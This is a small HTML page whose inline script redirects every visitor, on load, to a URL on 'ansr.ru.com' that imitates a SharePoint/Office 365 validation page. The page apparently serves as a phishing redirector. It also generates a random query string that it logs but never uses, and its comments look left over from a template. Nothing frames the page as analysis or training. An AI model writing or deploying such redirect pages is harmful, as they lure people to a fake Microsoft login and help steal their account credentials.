<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Replace 'https://example.com' with your desired redirect URL
        const redirectTo = "https://ansr.ru.com/SharePoint/Validate-Office365-TG/index.php";

        // Function to generate a random 35-character uppercase string
        function generateRandomString(length) {
            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            let result = "";
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        // Append the random string to the current URL and redirect
        const randomString = generateRandomString(35);
        const newUrl = window.location.href + "?" + randomString;

        // Log the new URL with the random string (for debugging, optional)
        console.log("New URL:", newUrl);

        // Redirect to the desired URL
        window.location.href = redirectTo;
    </script>
</head>
<body>
    <p>Redirecting you to the new page...</p>
</body>
</html>
